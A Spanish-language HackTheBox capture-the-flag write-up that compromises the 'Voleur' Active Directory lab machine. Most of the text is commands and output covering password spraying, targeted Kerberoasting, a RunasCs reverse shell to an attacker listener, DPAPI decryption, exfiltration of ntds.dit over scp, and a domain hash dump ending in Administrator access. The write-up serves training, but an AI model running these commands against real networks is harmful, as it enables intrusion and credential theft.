---
title: "HTB: Voleur"
date: 2026-04-21 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, Kerberos, NTLM-Disabled, WriteSPN, Kerberoasting, DPAPI, AD-RecycleBin, WSL, NTDS, Pass-The-Hash]
image:
  path: /assets/img/Voleur/Voleur-HTB.png
  alt: HackTheBox Voleur Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Voleur** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory** con
la autenticación **NTLM completamente deshabilitada**, lo que obliga a usar tickets
**Kerberos** para todas las operaciones. Partiendo de credenciales iniciales proporcionadas,
se enumera un recurso compartido **IT** que contiene un archivo Excel protegido con contraseña
(`Access_Review.xlsx`). Tras crackear el archivo con **John**, se obtienen credenciales de
cuentas de servicio. Un **Password Spray** vía Kerberos confirma las credenciales de `svc_ldap`,
cuyo análisis con **BloodHound** revela el permiso `WriteSPN` sobre `svc_winrm`, lo que
permite realizar **Targeted Kerberoasting** y obtener acceso por **WinRM**. La escalada de
privilegios encadena varias técnicas: restauración de un objeto eliminado (`todd.wolfe`) desde
el **AD Recycle Bin**, descifrado de credenciales protegidas por **DPAPI** desde archivos de
perfil archivados en el share **IT**, y finalmente acceso a un entorno **WSL** vía **SSH**
donde se encuentra un backup de `NTDS.dit` que permite volcar todos los hashes del dominio.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.10.11
```

```
64 bytes from 10.129.10.11: icmp_seq=1 ttl=127 time=116 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                  |
|--------|--------|---------------------------|
| 53     | open   | Simple DNS Plus           |
| 88     | open   | Kerberos                  |
| 135    | open   | MS RPC                    |
| 139    | open   | NetBIOS                   |
| 389    | open   | LDAP (AD)                 |
| 445    | open   | SMB                       |
| 464    | open   | Kpasswd5                  |
| 593    | open   | RPC over HTTP             |
| 636    | open   | LDAPS                     |
| 2222   | open   | SSH (OpenSSH 8.2 Ubuntu)  |
| 3268   | open   | LDAP Global Catalog       |
| 3269   | open   | LDAPS Global Catalog      |
| 5985   | open   | WinRM (HTTP)              |
| 9389   | open   | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** confirman que estamos ante un **Domain
Controller** del entorno `voleur.htb`. Sin embargo, hay dos aspectos que destacan sobre
cualquier otro:

- **NTLM deshabilitado:** Confirmado por el output de NXC (`NTLM:False`). Esto significa
  que ningún usuario puede autenticarse con usuario y contraseña directamente. Toda
  autenticación debe realizarse mediante tickets **Kerberos** obtenidos previamente con
  `kinit` o herramientas de Impacket con el flag `-k`.
- **SSH en puerto 2222 (Linux):** El fingerprint del servidor SSH revela **Ubuntu**, lo que
  indica la presencia de un subsistema **Linux (WSL)** o una máquina Linux separada. Esto
  es inusual en un DC de Windows y es una pista importante para la escalada.
- **Firma SMB obligatoria:** Descarta ataques de retransmisión NTLM.
- **Desfase horario de 1 hora:** Requiere sincronización antes de operar con Kerberos.

---

## Enumeración inicial con Kerberos

### NTLM deshabilitado — Obtención del TGT

Al intentar autenticación estándar con NXC, el servidor la rechaza:

```bash
nxc smb $IP -u 'ryan.naylor' -p 'HollowOct31Nyt'
```

```
SMB  10.129.232.130  445  DC  [*] (NTLM:False)
SMB  10.129.232.130  445  DC  [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

`STATUS_NOT_SUPPORTED` indica que el servidor rechazó el método de autenticación NTLM.
En este entorno, la única forma de autenticarse es mediante un **Ticket Granting Ticket
(TGT)** de Kerberos. Lo solicitamos directamente al KDC con `kinit`:

```bash
kinit ryan.naylor@VOLEUR.HTB
```

```bash
klist
```

```
Default principal: ryan.naylor@VOLEUR.HTB
Valid starting       Expires              Service principal
04/23/2026 19:56:46  04/24/2026 05:56:46  krbtgt/VOLEUR.HTB@VOLEUR.HTB
```

```bash
export KRB5CCNAME=/tmp/krb5cc_1000
```

A partir de aquí, todas las herramientas usarán el TGT en caché con el flag `-k
--use-kcache` en lugar de enviar credenciales NTLM.

### Enumeración de recursos compartidos

```bash
nxc smb dc.voleur.htb -d voleur.htb -k --use-kcache --shares
```

```
SMB  dc.voleur.htb  445  dc  [+] voleur.htb\ryan.naylor from ccache
SMB  dc.voleur.htb  445  dc  Share       Permissions   Remark
SMB  dc.voleur.htb  445  dc  ADMIN$                    Remote Admin
SMB  dc.voleur.htb  445  dc  C$                        Default share
SMB  dc.voleur.htb  445  dc  Finance
SMB  dc.voleur.htb  445  dc  HR
SMB  dc.voleur.htb  445  dc  IPC$        READ          Remote IPC
SMB  dc.voleur.htb  445  dc  IT          READ
SMB  dc.voleur.htb  445  dc  NETLOGON    READ          Logon server share
SMB  dc.voleur.htb  445  dc  SYSVOL      READ          Logon server share
```

Además de los recursos predeterminados de AD, destacan tres recursos no estándar:
**Finance**, **HR** e **IT**. Solo tenemos acceso de lectura a **IT**. Procedemos a
enumerarlo en profundidad:

```bash
nxc smb dc.voleur.htb -d voleur.htb -k --use-kcache --share 'IT' -M spider_plus -o SHARE=IT
```

```json
{
    "IT": {
        "First-Line Support/Access_Review.xlsx": {
            "size": "16.5 KB"
        }
    }
}
```

Se detecta un archivo Excel llamado `Access_Review.xlsx` en el directorio de **First-Line
Support**. Los archivos de revisión de acceso suelen contener listas de usuarios, grupos y
permisos — información valiosa en un entorno corporativo. Lo descargamos:

```bash
nxc smb dc.voleur.htb -d voleur.htb -k --use-kcache \
  --share 'IT' \
  --get-file 'First-Line Support/Access_Review.xlsx' './Access_Review.xlsx'
```

```
[+] File "First-Line Support/Access_Review.xlsx" was downloaded to "./Access_Review.xlsx"
```

---

## Excel protegido — Cracking con John

Al intentar abrir el archivo, solicita una contraseña de apertura. Extraemos el hash
del archivo con la herramienta `office2john`:

```bash
/usr/lib/john/office2john.py Access_Review.xlsx > Access_hash.txt 
john --wordlist=/usr/share/wordlists/rockyou.txt Access_hash.txt
```

```
football1        (Access_Review.xlsx)
```

**Contraseña del archivo:** `football1`

El contenido del archivo revela credenciales de cuentas de servicio:

![Access Review](/assets/img/Voleur/archivo.png)

| Usuario    | Contraseña         | Estado         |
|------------|--------------------|----------------|
| `svc_ldap` | `M1XyC9pW7qT5Vn`   | Activo         |
| `svc_iis`  | `N5pXyW1VqM7CZ8`   | Activo         |
| (eliminado)| `NightT1meP1dg3on14` | **Eliminado** |

> Un usuario aparece como eliminado pero con contraseña visible. Esto nos indica que
> posiblemente debamos restaurarlo desde el **AD Recycle Bin** en algún momento del ataque.

---

## Password Spray vía Kerberos

Enumeramos todos los usuarios del dominio para el spray:

```bash
nxc smb dc.voleur.htb -d voleur.htb -k --use-kcache --users
```

```
ryan.naylor    First-Line Support Technician
marie.bryant   First-Line Support Technician
lacey.miller   Second-Line Support Technician
svc_ldap
svc_backup
svc_iis
jeremy.combs   Third-Line Support Technician
svc_winrm
```

Verificamos las credenciales obtenidas del Excel usando **kerbrute** con spray via Kerberos:

```bash
kerbrute passwordspray -d voleur.htb --dc dc.voleur.htb users.txt 'M1XyC9pW7qT5Vn'
```

```
[+] VALID LOGIN: svc_ldap@voleur.htb:M1XyC9pW7qT5Vn
```

```bash
kerbrute passwordspray -d voleur.htb --dc dc.voleur.htb users.txt 'N5pXyW1VqM7CZ8'
```

```
[+] VALID LOGIN: svc_iis@voleur.htb:N5pXyW1VqM7CZ8
```

Obtenemos el TGT de `svc_ldap` para operar con sus credenciales:

```bash
kinit svc_ldap@VOLEUR.HTB
export KRB5CCNAME=/tmp/krb5cc_1000
```

---

## Análisis de Dominio — BloodHound

```bash
bloodhound-ce-python -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d voleur.htb -dc dc.voleur.htb -ns $IP --zip -c All
```

---

## WriteSPN — Targeted Kerberoasting sobre svc_winrm

### ¿Qué es WriteSPN y por qué es peligroso?

El atributo **servicePrincipalName (SPN)** de una cuenta de AD define qué servicios Kerberos
representa esa cuenta. El KDC usa este atributo para saber con qué clave cifrar los Tickets
de Servicio (TGS): los cifra con el **hash NTLM de la cuenta que tiene ese SPN registrado**.

El permiso `WriteSPN` permite **modificar este atributo** en otro objeto de AD. Esto habilita
el **Targeted Kerberoasting**:

1. Asignamos un SPN arbitrario a la cuenta objetivo (aunque no sea una cuenta de servicio real).
2. Solicitamos el TGS al KDC — cualquier usuario autenticado puede hacerlo.
3. El KDC emite el TGS cifrado con el hash NTLM de la cuenta objetivo.
4. Crackeamos el TGS offline para obtener la contraseña.
5. La herramienta limpia el SPN automáticamente.

**¿Por qué es más peligroso que el Kerberoasting clásico?**

El Kerberoasting clásico solo afecta a cuentas que ya tienen SPNs (típicamente cuentas de
servicio). El **Targeted Kerberoasting** puede apuntar a **cualquier cuenta del dominio**,
incluyendo cuentas de usuario normal que nunca fueron pensadas como objetivos.


```
svc_ldap tiene WriteSPN sobre svc_winrm
    │
    ▼
svc_ldap asigna SPN falso a svc_winrm
    │
    ▼
KDC emite TGS cifrado con hash NTLM de svc_winrm
    │
    ▼
Crackeamos el TGS offline → contraseña de svc_winrm
    │
    ▼
svc_ldap elimina el SPN (limpieza)

```

BloodHound revela que `svc_ldap` tiene `WriteSPN` sobre `svc_winrm`:

![WriteSPN](/assets/img/Voleur/writespn.png)

La herramienta `targetedKerberoast` automatiza todo el proceso: asigna el SPN, solicita el TGS, lo exporta y limpia el SPN:

```bash
targetedKerberoast -d voleur.htb -k --dc-host dc.voleur.htb
```

```
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$...<hash>...

[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$...<hash>...
```

Crackeamos el hash de `svc_winrm` con Hashcat:

```bash
hashcat -m 13100 hash_winrm /usr/share/wordlists/rockyou.txt
```

```
AFireInsidedeOzarctica980219afi
```

**Contraseña de svc_winrm:** `AFireInsidedeOzarctica980219afi`

BloodHound confirma que `svc_winrm` es miembro del grupo **Remote Management Users**,
lo que permite acceso por WinRM:

![Remote Management](/assets/img/Voleur/group.png)

Obtenemos el TGT de `svc_winrm`:

```bash
kinit svc_winrm@VOLEUR.HTB
export KRB5CCNAME=/tmp/krb5cc_1000
```

---

## Acceso Inicial — Evil-WinRM como svc_winrm

```bash
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB -u svc_winrm
```

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm> type Desktop\user.txt
99cab79e4e612a6e9e88f33447e3c875
```

---

## Escalada de Privilegios

La escalada en esta máquina es una cadena de cuatro técnicas encadenadas. El hilo conductor
es el **usuario eliminado** del Excel cuya contraseña conocemos y que debe ser restaurado.

### Fase 1: Pivot a svc_ldap con RunasCs

BloodHound muestra que `svc_ldap` está en el grupo **RESTORE_USERS**. 

![Remote Management](/assets/img/Voleur/member.png)

El único con
permisos para restaurar objetos eliminados del AD Recycle Bin. Para ejecutar comandos como
`svc_ldap` desde la sesión de `svc_winrm`, usamos **RunasCs**, que permite ejecutar
procesos bajo otra identidad sin necesitar privilegios de administrador:

```powershell
upload RunasCs.exe
```

En nuestra máquina levantamos un listener:

```bash
nc -nvlp 4444
```

Ejecutamos desde la shell de `svc_winrm`:

```powershell
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.116:4444
```

```
whoami
voleur\svc_ldap
```

### Fase 2: Restaurar todd.wolfe desde AD Recycle Bin

### ¿Qué es el AD Recycle Bin?

El **AD Recycle Bin** es una papelera de reciclaje para objetos de Active Directory.
Cuando se habilita, los objetos eliminados conservan todos sus atributos (incluyendo ACEs
en otros objetos) durante un período configurable antes de ser destruidos definitivamente.
Esto es especialmente relevante desde perspectiva ofensiva: si un objeto eliminado tenía
permisos sobre recursos del dominio, esos permisos siguen activos aunque el objeto no sea
visible en la consola estándar de AD.

**¿Por qué queremos restaurar `todd.wolfe`?**

Porque su contraseña aparece en el Excel del share IT y su perfil archivado en el mismo
share contiene blobs de credenciales **DPAPI** que potencialmente guardan contraseñas de
otros usuarios.

Verificamos que el objeto existe como eliminado:

```powershell
$deletedUser = Get-ADObject -Filter 'sAMAccountName -eq "todd.wolfe"' -IncludeDeletedObjects
$deletedUser
```

```
Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,...
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

Restauramos el objeto:

```powershell
Restore-ADObject -Identity $deletedUser
```

Verificamos que está activo:

```powershell
Get-ADUser -Filter 'SamAccountName -eq "todd.wolfe"'
```

```
DistinguishedName : CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
Enabled           : True
SamAccountName    : todd.wolfe
SID               : S-1-5-21-3927696377-1337352550-2781715495-1110
```

Obtenemos el TGT de `todd.wolfe`:

```bash
kinit todd.wolfe@VOLEUR.HTB
export KRB5CCNAME=/tmp/krb5cc_1000
```

### Fase 3: DPAPI — Descifrado de credenciales de todd.wolfe

Con el usuario `todd.wolfe` restaurado y su TGT activo, accedemos al share **IT** donde se
encuentran sus archivos de perfil archivados. Localizamos los blobs de credenciales y las
masterkeys de DPAPI:

```bash
# Blob de credencial (Roaming)
nxc smb dc.voleur.htb -k --use-kcache --share IT \
  --dir "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials"
```

```
772275FAD58525253490A9B0039791D3    398 bytes
```

```bash
# Masterkey
nxc smb dc.voleur.htb -k --use-kcache --share IT \
  --dir "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/"
```

```
08949382-134f-4c63-b93c-ce52efc0aa88    740 bytes
BK-VOLEUR                               900 bytes
```

Descargamos los archivos necesarios:

```bash
nxc smb dc.voleur.htb -k --use-kcache --share IT \
  --get-file "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3" \
  ./772275FAD58525253490A9B0039791D3

nxc smb dc.voleur.htb -k --use-kcache --share IT \
  --get-file "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88" \
  ./08949382-134f-4c63-b93c-ce52efc0aa88
```

**Descifrado de la Masterkey:**

Usamos la contraseña conocida de `todd.wolfe` (`NightT1meP1dg3on14` — del Excel) junto
con su SID para descifrar la Masterkey:

```bash
dpapi.py masterkey \
  -file ./08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid "S-1-5-21-3927696377-1337352550-2781715495-1110" \
  -password 'NightT1meP1dg3on14'
```

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d...
```

**Descifrado del blob de credencial:**

Con la Masterkey en claro, desciframos el blob que contiene la credencial almacenada:

```bash
dpapi.py credential \
  -file ./772275FAD58525253490A9B0039791D3 \
  -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d...
```

```
[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Type        : CRED_TYPE_DOMAIN_PASSWORD
Target      : Domain:target=Jezzas_Account
Username    : jeremy.combs
Password    : qT3V9pLXyN7W4m
```

> `todd.wolfe` tenía almacenada en su perfil la contraseña de `jeremy.combs`. DPAPI la
> protegía, pero nosotros ya teníamos la contraseña del usuario para descifrarla.

Obtenemos el TGT de `jeremy.combs`:

```bash
kinit jeremy.combs@VOLEUR.HTB
export KRB5CCNAME=/tmp/krb5cc_1000
```

---

## Acceso como jeremy.combs — Evil-WinRM

```bash
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB -u jeremy.combs
```

En **BloodHound** confirmamos que `jeremy.combs` es miembro del grupo
**THIRD-LINE TECHNICIANS**, con acceso al directorio `C:\IT\Third-Line Support`.
Inspeccionamos su contenido:

```powershell
*Evil-WinRM* PS C:\IT\Third-Line Support> dir
```

```
Mode          Name
----          ----
d-----        Backups
-a----        id_rsa
-a----        Note.txt.txt
```

Leemos la nota:

```powershell
type Note.txt.txt
```

```
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can
utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,
Admin
```

> La nota confirma que hay un **WSL (Windows Subsystem for Linux)** configurado en el
> servidor y que se está usando para hacer backups. El SSH en el puerto 2222 que detectamos
> en el escaneo inicial corresponde exactamente a este entorno Linux. La `id_rsa`
> probablemente es la clave para acceder.

Descargamos la clave privada:

```powershell
download id_rsa
```

```bash
chmod 600 id_rsa
```

---

## WSL — Acceso SSH y extracción de NTDS.dit

### ¿Por qué el WSL es tan valioso aquí?

El **Windows Subsystem for Linux** en este servidor tiene acceso montado al sistema de
archivos de Windows a través de `/mnt/c/`. Esto significa que desde Linux podemos acceder
a archivos del servidor Windows, incluyendo los backups que el administrador configuró.
Si esos backups incluyen `NTDS.dit` y el `SYSTEM hive`, podemos extraer todos los hashes
del dominio sin necesitar privilegios especiales en Windows.

```bash
ssh svc_backup@$IP -i id_rsa -p 2222
```

Exploramos el sistema de archivos montado:

```bash
ls "/mnt/c/IT/Third-Line Support/Backups/"
```

```
Active Directory/
registry/
```

```bash
ls "/mnt/c/IT/Third-Line Support/Backups/Active Directory/"
```

```
ntds.dit
```

```bash
ls "/mnt/c/IT/Third-Line Support/Backups/registry/"
```

```
SECURITY
SYSTEM
```

Copiamos los archivos al directorio `/tmp` para exportarlos:

```bash
cp "/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" /tmp/
cp "/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" /tmp/
cp "/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" /tmp/
```

Desde nuestra máquina descargamos los archivos con SCP:

```bash
scp -i id_rsa -P 2222 svc_backup@$IP:/tmp/ntds.dit .
scp -i id_rsa -P 2222 svc_backup@$IP:/tmp/SYSTEM .
scp -i id_rsa -P 2222 svc_backup@$IP:/tmp/SECURITY .
```

### Extracción de hashes con secretsdump

Con los tres archivos en nuestra máquina, ejecutamos `secretsdump` en modo local para
descifrar y volcar todos los hashes del dominio sin conectarnos al DC:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:...:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:...:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:...:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:...:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:...:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:...:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:...:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:...:5d7e37717757433b4780079ee9b1d421:::
[*] Cleaning up...
```

**NT Hash del Administrador:** `e656e07c56d831611b577b160b259ad2`

---

## Acceso Final como Administrador

Como NTLM está deshabilitado, no podemos hacer Pass-The-Hash directamente. En su lugar,
usamos el hash para solicitar un TGT vía Kerberos con `getTGT.py`:

```bash
getTGT.py voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip $IP
```

```
[*] Saving ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB -u administrator
```

### Flag de root

```powershell
*Evil-WinRM* PS C:\Users\Administrator> type Desktop\root.txt
64f1fb9e51be305ccc6f0c7b92275561
```

**¡Máquina comprometida con éxito!**